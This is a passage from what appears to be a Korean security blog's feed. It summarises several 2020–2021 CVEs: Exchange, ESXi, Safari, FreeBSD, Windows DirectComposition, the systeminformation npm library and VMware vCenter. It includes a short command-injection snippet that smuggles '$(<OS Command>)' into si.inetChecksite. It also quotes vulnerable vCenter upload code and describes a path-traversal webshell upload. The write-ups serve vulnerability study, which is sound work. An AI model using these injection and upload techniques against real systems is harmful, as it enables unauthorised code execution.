&#xD574;&#xB2F9; &#xBA54;&#xC2DC;&#xC9C0;&#xAC00; deserialize &#xB418;&#xBA74;&#xC11C; arbitrary code execution&#xC744; &#xD560; &#xC218; &#xC788;&#xB2E4;. Exchange&#xB294; &#xBCF4;&#xD1B5; &#xC5D4;&#xD130;&#xD504;&#xB77C;&#xC774;&#xC988;&#xC758; &#xC911;&#xC2EC;&#xC5D0; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Exchange Server&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD558;&#xACE0; &#xD574;&#xCEE4;&#xB4E4;&#xB3C4; &#xB9E4;&#xC6B0; &#xD0D0;&#xB0B8;&#xB2E4;. &#xB9CC;&#xC57D; &#xB2F9;&#xC2E0;&#xC758; &#xC870;&#xC9C1;&#xC5D0;&#xC11C; &#xC544;&#xC9C1; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD328;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;&#xBA74;, &#xCD5C;&#xB300;&#xD55C; &#xBE68;&#xB9AC; &#xD328;&#xCE58;&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xAE38; &#xBC14;&#xB780;&#xB2E4;. &#xC880; &#xB354; &#xB514;&#xD14C;&#xC77C;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC740; &#xC774; <a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">&#xB9C1;&#xD06C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="CVE-2020-3992-ZDI-20-1377"><a href="#CVE-2020-3992-ZDI-20-1377" class="headerlink" title="CVE-2020-3992/ZDI-20-1377"></a>CVE-2020-3992/ZDI-20-1377</h1><p><strong>VMware ESXi SLP Use-After-Free Remote Code Execution Vulnerability</strong></p><p>&#xC774; &#xBC84;&#xADF8;&#xB294; ZDI &#xCDE8;&#xC57D;&#xC810; &#xC5F0;&#xAD6C;&#xC6D0; Lucas Leong&#xC774; &#xBC1C;&#xACAC;&#xD55C; &#xBC84;&#xADF8;&#xC774;&#xB2E4;. ESXi&#xB294; VMWare &#xC0AC;&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xD55C; &#xC5D4;&#xD130;&#xD504;&#xB77C;&#xC774;&#xC988;&#xAE09; &#xD558;&#xC774;&#xD37C;&#xBC14;&#xC774;&#xC800;&#xC774;&#xB2E4;. Service Location Protocol(SLP)&#xB294; ESXi&#xC5D0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C; &#xC911; &#xD558;&#xB098;&#xC774;&#xB2E4;. SDP&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD0D0;&#xC0C9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9C0;&#xC6D0;&#xD558;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774;&#xB2E4;. SLP&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xC778;&#xAE30; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774; OpenSLP&#xC778;&#xB370;, Lucas&#xB294; ESXi&#xC5D0;&#xC11C; &#xC790;&#xCCB4; &#xC81C;&#xC791;&#xD55C; &#xBC84;&#xC804;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xBC1C;&#xACAC;&#xD558;&#xC600;&#xB2E4;. &#xAC70;&#xAE30;&#xB2E4;&#xAC00; &#xC774; &#xC790;&#xCCB4; &#xC81C;&#xC791; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD06C;&#xB9AC;&#xD2F0;&#xCEEC;&#xD55C; &#xCDE8;&#xC57D;&#xC810; &#xB450; &#xAC1C;&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xB2E4;.</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1377/">&#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC810;</a>&#xC740; Use-After-Free(UAF) &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; <code>SLPDPorcessMessage()</code>&#xC5D0;&#xC11C; SLPMessage &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; free &#xB418;&#xC5C8;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; SLPDatabase &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB808;&#xD37C;&#xB7F0;&#xC2A4; &#xD558;&#xACE0; &#xC788;&#xC5B4; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; WAN &#xD658;&#xACBD;&#xC5D0; &#xC788;&#xB294; &#xD574;&#xCEE4;&#xC5D0; &#xC758;&#xD574; &#xD65C;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xB2E4;.  </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB41C; &#xC774;&#xD6C4;, VMware&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD328;&#xCE58;&#xD558;&#xC600;&#xC9C0;&#xB9CC; &#xC81C;&#xB300;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xC600;&#xACE0; ZDI-CAN-12190&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xC5D0; &#xB300;&#xD55C; bypass &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC81C;&#xBCF4;&#xB418;&#xC5C8;&#xB2E4;. </p><p>&#xB610; &#xD55C; &#xAC00;&#xC9C0; &#xC8FC;&#xBAA9;&#xD560;&#xB9CC;&#xD55C; &#xC810;&#xC740; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xACF5;&#xACA9;&#xD560; &#xC218; &#xC788;&#xAE30;&#xB3C4; &#xD558;&#xC9C0;&#xB9CC;, &#xC81C;&#xD55C;&#xB41C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0;&#xC11C;&#xC758; sandbox escape&#xB3C4; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574;, EXSi &#xAC19;&#xC774; &#xB9CE;&#xC774; &#xC5F0;&#xAD6C;&#xB41C; &#xC81C;&#xD488;&#xB4E4;&#xC5D0;&#xC11C;&#xB3C4; &#xC544;&#xC9C1; &#xC54C;&#xC9C0; &#xBABB;&#xD588;&#xB358;(&#xC798; &#xC0B4;&#xD3B4;&#xBCF4;&#xC9C0; &#xC54A;&#xC558;&#xB358;) attack surface&#xB4E4;&#xC774; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC5C8;&#xB2E4;.</p><h1 id="CVE-2020-9850-ZDI-20-672"><a href="#CVE-2020-9850-ZDI-20-672" class="headerlink" title="CVE-2020-9850/ZDI-20-672"></a>CVE-2020-9850/ZDI-20-672</h1><p><strong>Apple Safari in Operator JIT Type Confusion Remote Code Execution Vulnerability</strong></p><p>&#xC774; &#xBC84;&#xADF8;&#xB294; Georgia Tech Systems Software &amp; Security Lab&#xD300;&#xC774; <a href="https://taesoo.kim/pubs/2020/jin:pwn2own2020-safari-slides.pdf">Pwn2Own&#xC5D0; &#xCC38;&#xC5EC;&#xD558;&#xBA74;&#xC11C;</a> &#xC81C;&#xBCF4;&#xD55C; &#xBC84;&#xADF8;&#xC774;&#xB2E4;. &#xC774; &#xBC84;&#xADF8;&#xB294; DFG &#xB2E8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Webkit type confusion&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xB418;&#xB294; &#xBC84;&#xADF8; &#xCCB4;&#xC778;&#xC758; &#xD55C; &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC791;&#xB144;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; &#xC774; <a href="https://www.zerodayinitiative.com/blog/2019/11/25/diving-deep-into-a-pwn2own-winning-webkit-bug">&#xBC84;&#xADF8;</a>&#xC640; &#xC720;&#xC0AC;&#xD558;&#xB2E4;. OpenGL&#x2019;s CVM(Core Virtual Machine)&#xC758; &#xD799; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xBC84;&#xADF8;&#xC640; &#xCCB4;&#xC774;&#xB2DD; &#xD558;&#xBA74; &#xC0AC;&#xD30C;&#xB9AC;&#xC5D0;&#xC11C; &#x201C;.app&#x201D; symlink&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xB808;&#xC774;&#xC2A4; &#xCEE8;&#xB514;&#xC158;&#xC744; &#xD1B5;&#xD574; cfprefsd&#xC640; kextload&#xC5D0;&#xC11C; first-time app protection &#xC6B0;&#xD68C;, root &#xC811;&#xADFC;, &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC774;&#xB904;&#xC9C0;&#xBA70; &#xBAA8;&#xB4E0; &#xAC83;&#xB4E4;&#xC740; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xC6F9;&#xD398;&#xC774;&#xC9C0;&#xB97C; &#xBC29;&#xBB38;&#xD558;&#xACE0; &#xB09C; &#xD6C4; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC;&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4;&#xB2E4;. </p><p>&#xD55C; &#xC6F9; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC811;&#xC18D;&#xD588;&#xB294;&#xB370; 10&#xCD08; &#xD6C4;&#xC5D0; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xB2F9;&#xC2E0;&#xC758; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD574;&#xBCF4;&#xB77C;. &#xC18C;&#xB984;&#xC774; &#xB3CB;&#xC744; &#xC815;&#xB3C4;&#xC774;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xADF8;&#xB4E4;&#xC740; Pwn2Own&#xC5D0;&#xC11C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xB370;&#xBAA8;&#xB97C; &#xB9C8;&#xCCD0; $70,000&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xC600;&#xB2E4;. </p><h1 id="CVE-2020-7460-ZDI-20-949"><a href="#CVE-2020-7460-ZDI-20-949" class="headerlink" title="CVE-2020-7460/ZDI-20-949"></a>CVE-2020-7460/ZDI-20-949</h1><p><strong>FreeBSD Kernel sendmsg System Call Time-Of-Check Time-Of-Use Privilege Escalation Vulnerability</strong></p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; m00nbsd&#xB77C;&#xB294; &#xB2C9;&#xB124;&#xC784;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD55C; &#xC5F0;&#xAD6C;&#xC6D0;&#xC774; ZDI&#xC5D0; &#xC81C;&#xBCF4;&#xD558;&#xC600;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; FreeBSD&#xC758; 32-bit <code>sendmsg()</code> &#xC2DC;&#xC2A4;&#xD15C; &#xCF5C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; Time-Of-Check, Time-Of-Use(TOCTOU) &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C; kernel-level code execution&#xC744; &#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC2DC;&#xC2A4;&#xD15C; &#xCF5C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; double-fetch &#xBC84;&#xADF8;&#xB85C; &#xC720;&#xC800; &#xB79C;&#xB4DC;&#xC5D0; &#xC788;&#xB294; MsgLen &#xBCC0;&#xC218;&#xC5D0; &#xCCAB; access&#xAC00; &#xC788;&#xACE0; &#xB09C; &#xD6C4;, &#xB450; &#xBC88;&#xC9F8; access&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xB354; &#xD070; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xAFB8;&#xBA74; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xB8E8;&#xD504;&#xC5D0;&#xC11C; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xC778;&#xC790;&#xB85C; <code>sendmsg()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xC2A4;&#xB808;&#xB4DC;&#xB97C; &#xD558;&#xB098;&#xC640; MsgLen&#xC744; &#xD070; &#xAC12;&#xC73C;&#xB85C; &#xC870;&#xC791;&#xD558;&#xB294; &#xC2A4;&#xB808;&#xB4DC; &#xD558;&#xB098;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xB808;&#xC774;&#xC2A4; &#xCEE8;&#xB514;&#xC158;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xBC84;&#xADF8;&#xC758; &#xB09C;&#xC774;&#xB3C4;&#xB294; &#xB0AE;&#xC9C0;&#xB9CC; &#xBE44;&#xAD50;&#xC801; &#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xC0B4;&#xC544;&#xB0A8;&#xC558;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC791;&#xB144; 9&#xC6D4;&#xC5D0; &#xC774; &#xBC84;&#xADF8;&#xC5D0; &#xB300;&#xD574; &#xD3EC;&#xC2A4;&#xD305;&#xC744; &#xD558;&#xC600;&#xC73C;&#xB2C8; &#xAD00;&#xC2EC;&#xC774; &#xC788;&#xB2E4;&#xBA74; <a href="https://www.zerodayinitiative.com/blog/2020/9/1/cve-2020-7460-freebsd-kernel-privilege-escalation">&#xC5EC;&#xAE30;</a>&#xC5D0;&#xC11C; &#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="CVE-2020-17057-ZDI-20-1371"><a href="#CVE-2020-17057-ZDI-20-1371" class="headerlink" title="CVE-2020-17057/ZDI-20-1371"></a><a href="https://hackyboiz.github.io/2021/01/01/l0ch/2021-01-01/">CVE-2020-17057</a>/ZDI-20-1371</h1><p><strong>Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</strong></p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Windows&#xC758; DirectComposition&#xC774;&#xB77C;&#xB294; &#xCEE4;&#xB110; &#xBAA8;&#xB4DC;&#xC758; &#xADF8;&#xB798;&#xD53D; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xB2E4;. <code>win32kbase!DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> &#xD568;&#xC218;&#xB294; &#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; <code>DirectComposition::CInteractionTrackerMarshaler</code> &#xD0C0;&#xC785;&#xC758; &#xAC1D;&#xCCB4;&#xB97C; &#xCC44;&#xC6B4;&#xB2E4;. &#xB9CC;&#xC57D; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBE44;&#xC815;&#xC0C1;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBC1C;&#xACAC;&#xD558;&#xBA74;, &#xC5D0;&#xB7EC;&#xB97C; &#xD578;&#xB4E4;&#xB9C1;&#xD558;&#xB294; &#xBD84;&#xAE30;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAC8C; &#xB418;&#xB294;&#xB370;, &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xD55C; &#xAC1D;&#xCCB4;&#xC5D0; &#xC788;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;&#xB4E4;&#xC744; release &#xD55C;&#xB2E4;. Release &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD3EC;&#xC778;&#xD130;&#xB97C; release &#xD558;&#xAC8C; &#xB41C;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xCEE4;&#xB294; &#xCEE4;&#xB110; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xACE0; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; SYSTEM &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>j0ker</tag>
      
      <tag>zdi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21315: node js library command injection</title>
    <link href="/2021/03/20/fabu1ous/2021-03-20/"/>
    <url>/2021/03/20/fabu1ous/2021-03-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">CVE-2021-21315-systeminformation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>systeminformation Library for Node.JS (npm package &#x201C;systeminformation&#x201D;) &lt; 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-21315&#xB294; npm &#xD328;&#xD0A4;&#xC9C0;&#xC778;  <code>systeminformation</code>&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; command injection &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. <code>systeminformation</code> &#xD328;&#xD0A4;&#xC9C0;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;, &#xC2DC;&#xC2A4;&#xD15C; &#xBC0F; OS &#xB4F1;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC758; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xD568;&#xC218; &#xBAA8;&#xC74C;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xC911; <code>si.inetLatency()</code>, <code>si.inetChecksite()</code>, <code>si.services()</code>, <code>si.processLoad()</code> &#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xAC12;&#xC740; sanitizing &#xD574;&#xC57C; &#xD558;&#xBA70; array &#xD615;&#xD0DC;&#xB85C; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xBAA8;&#xB450; &#xCC28;&#xB2E8;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>String array &#xB370;&#xC774;&#xD130;&#xB294; &#xD568;&#xC218; <code>sanitizeShellString()</code>&#xC758; sanitizing &#xC791;&#xC5C5;&#xC744; &#xBB34;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xC5B4;<code>si.inetLatency()</code>, <code>si.inetChecksite()</code>, <code>si.services()</code>, <code>si.processLoad()</code> &#xD568;&#xC218;&#xB4E4;&#xC758; &#xC11C;&#xBE44;&#xC2A4; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC2DC; command injection&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">const si = require(<span class="hljs-string">&apos;systeminformation&apos;</span>);const <span class="hljs-built_in">command</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;OS Command&gt;)</span>&quot;</span>;si.inetChecksite([<span class="hljs-built_in">command</span>]);</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>command injection</tag>
      
      <tag>node js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21972: VMware vCenter의 인증되지 않은 시스템 권한의 원격 코드 실행 취약점</title>
    <link href="/2021/03/19/l0ch/2021-03-19/"/>
    <url>/2021/03/19/l0ch/2021-03-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/unauth-rce-vmware/">Unauthorized RCE in VMware vCenter</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>vmware vcenter_server 7.0 U1c &#xC774;&#xC804;</li><li>vmware vcenter_server 6.7 U3l &#xC774;&#xC804;</li><li>vmware vcenter_server 6.5 U3n &#xC774;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMware &#xC911;&#xC559; &#xC9D1;&#xC911;&#xC2DD; &#xAD00;&#xB9AC; &#xC720;&#xD2F8;&#xB9AC;&#xD2F0;&#xC774;&#xBA70; &#xC5EC;&#xB7EC; &#xAC00;&#xC0C1; &#xC2DC;&#xC2A4;&#xD15C; &#xBC0F; ESXi &#xD638;&#xC2A4;&#xD2B8;&#xC640; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; vCenter&#xC5D0;&#xC11C; unrestricted file upload, path traversal &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>uploadova</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC758; &#xACBD;&#xB85C;&#xC778; <code>/ui/vropspluginui/rest/services/*</code> &#xB294; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">@RequestMapping(value = {<span class="hljs-string">&quot;/uploadova&quot;</span>}, method = {RequestMethod.POST})    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uploadOvaFile</span><span class="hljs-params">(@RequestParam(value = <span class="hljs-string">&quot;uploadFile&quot;</span>,required = <span class="hljs-literal">true</span>) CommonsMultipartFile uploadFile, HttpServletResponse response)</span> throws Exception </span>{...        <span class="hljs-keyword">if</span> (!uploadFile.isEmpty()) {            <span class="hljs-keyword">try</span> {                ...                InputStream inputStream = uploadFile.getInputStream();                File dir = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>);                <span class="hljs-keyword">if</span> (!dir.exists()) {                    dir.mkdirs();                } <span class="hljs-keyword">else</span> {                    String[] entries = dir.<span class="hljs-built_in">list</span>();                    String[] var9 = entries;                    <span class="hljs-keyword">int</span> var10 = entries.length;                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var11 = <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) {                        String entry = var9[var11];                        File currentFile = <span class="hljs-keyword">new</span> File(dir.getPath(), entry);                        currentFile.<span class="hljs-keyword">delete</span>();                    }                    logger.info(<span class="hljs-string">&quot;Successfully cleaned : /tmp/unicorn_ova_dir&quot;</span>);                }                TarArchiveInputStream in = <span class="hljs-keyword">new</span> TarArchiveInputStream(inputStream);                TarArchiveEntry entry = in.getNextTarEntry();                ArrayList result = <span class="hljs-keyword">new</span> ArrayList();...</code></pre><p><code>uploadova</code> &#xB294; &#xC544;&#xCE74;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC744; &#xBC1B;&#xC544; <code>/tmp/unicorn_ova_dir</code> &#xACBD;&#xB85C;&#xC5D0; &#xD574;&#xB2F9; &#xC544;&#xCE74;&#xC774;&#xBE0C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xB294;&#xB370;, &#xC0DD;&#xC131;&#xB418;&#xB294; &#xC544;&#xCE74;&#xC774;&#xBE0C; &#xB0B4;&#xBD80;&#xC758; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC5B4; <code>../</code> &#xC744; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xC6D0;&#xD558;&#xB294; &#xC704;&#xCE58;&#xC5D0; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Windows&#xC758; &#xACBD;&#xC6B0; &#xD574;&#xCEE4;&#xAC00; <code>.jsp</code> &#xD615;&#xC2DD;&#xC758; &#xC6F9; &#xC258;&#xC744; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xACBD;&#xB85C;&#xC778; <code>C:\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\</code> &#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD558;&#xBA74; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; vCenter &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xBAA8;&#xB4E0; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xC778;&#xC99D; &#xD6C4; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xD30C;&#xC77C; &#xC5C5;&#xB85C;&#xB4DC; &#xBC0F; path traversal &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB0A8;&#xC544;&#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC778;&#xC99D;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC5D0; &#xC758;&#xD55C; &#xACF5;&#xACA9;&#xC5D0;&#xB294; PoC&#xAC00; 